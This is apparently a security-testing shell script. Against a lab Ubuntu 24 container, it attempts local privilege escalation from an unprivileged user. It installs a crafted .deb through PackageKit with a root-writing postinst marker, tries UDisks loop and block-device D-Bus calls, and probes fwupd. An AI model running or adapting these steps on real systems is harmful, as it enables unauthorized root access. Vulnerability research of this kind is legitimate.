#!/bin/sh
set -eu

container="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$container" bash -s <<'ROOTSH'
set +e

cleanup() {
  pkill -TERM -u attacker pkcon 2>/dev/null || true
  sleep 1
  pkill -KILL -u attacker pkcon 2>/dev/null || true
  dpkg-query -W pkgfwudisks-pk >/dev/null 2>&1 && dpkg -r pkgfwudisks-pk >/dev/null 2>&1
  losetup -a | awk -F: '/pkgfwudisks/ {print $1}' | xargs -r losetup -d 2>/dev/null
  rm -rf /tmp/pkgfwudisks_* /root/pkgfwudisks_*
}
trap cleanup EXIT
cleanup

echo "[versions]"
dpkg-query -W packagekit packagekit-tools libpackagekit-glib2-18 fwupd fwupd-signed libfwupd2 udisks2 libudisks2-0 polkitd dbus systemd 2>/dev/null

echo "[attacker]"
runuser -u attacker -- id
runuser -u attacker -- bash -lc 'loginctl user-status attacker 2>&1 | sed -n "1,4p"'

echo "[build attacker local deb with root postinst marker]"
runuser -u attacker -- bash -s <<'ATKSH'
set -eu
mkdir -p /tmp/pkgfwudisks_pk/DEBIAN
cat > /tmp/pkgfwudisks_pk/DEBIAN/control <<'EOF'
Package: pkgfwudisks-pk
Version: 1.0
Architecture: all
Maintainer: probe <probe@example.invalid>
Description: PackageKit local install probe
EOF
cat > /tmp/pkgfwudisks_pk/DEBIAN/postinst <<'EOF'
#!/bin/sh
id > /root/pkgfwudisks_pkgkit_root
echo postinst-ran >> /root/pkgfwudisks_pkgkit_root
EOF
chmod 0755 /tmp/pkgfwudisks_pk/DEBIAN/postinst
dpkg-deb --build /tmp/pkgfwudisks_pk /tmp/pkgfwudisks_pk.deb
ATKSH

echo "[PackageKit local parser paths]"
runuser -u attacker -- pkcon get-files-local /tmp/pkgfwudisks_pk.deb 2>&1 | sed -n '1,80p'
runuser -u attacker -- pkcon get-details-local /tmp/pkgfwudisks_pk.deb 2>&1 | sed -n '1,80p'

echo "[PackageKit confirmed local install attempt]"
runuser -u attacker -- bash -lc 'timeout 40 pkcon -y install-local --allow-untrusted /tmp/pkgfwudisks_pk.deb' 2>&1 | sed -n '1,160p'
echo "[PackageKit proof check]"
ls -l /root/pkgfwudisks_pkgkit_root 2>&1 || true
[ -f /root/pkgfwudisks_pkgkit_root ] && sed -n '1,5p' /root/pkgfwudisks_pkgkit_root
dpkg-query -W pkgfwudisks-pk 2>&1 || true

echo "[UDisks loop setup attempt]"
runuser -u attacker -- bash -s <<'ATKSH'
set +e
dd if=/dev/zero of=/tmp/pkgfwudisks_loop.img bs=1M count=8 status=none
mkfs.ext4 -q /tmp/pkgfwudisks_loop.img
udisksctl loop-setup -f /tmp/pkgfwudisks_loop.img 2>&1 | sed -n '1,80p'
ATKSH
losetup -a | grep pkgfwudisks || true

echo "[UDisks direct block methods]"
runuser -u attacker -- bash -s <<'ATKSH'
set +e
busctl call org.freedesktop.UDisks2 /org/freedesktop/UDisks2/block_devices/vdb org.freedesktop.UDisks2.Block OpenDevice sa{sv} r 0 2>&1
busctl call org.freedesktop.UDisks2 /org/freedesktop/UDisks2/block_devices/vdb org.freedesktop.UDisks2.Block Rescan a{sv} 0 2>&1
busctl call org.freedesktop.UDisks2 /org/freedesktop/UDisks2/block_devices/vdb org.freedesktop.UDisks2.Filesystem Mount a{sv} 0 2>&1
ATKSH

echo "[fwupd activation]"
systemctl --no-pager --full status fwupd.service fwupd-refresh.timer 2>&1 | sed -n '1,80p'
runuser -u attacker -- bash -lc 'timeout 12 busctl introspect org.freedesktop.fwupd / org.freedesktop.fwupd --no-pager' 2>&1 | sed -n '1,80p'

echo "[cleanup proof]"
cleanup
dpkg-query -W pkgfwudisks-pk 2>&1 || true
ls -la /tmp | grep pkgfwudisks || true
ls -la /root | grep pkgfwudisks || true
ROOTSH
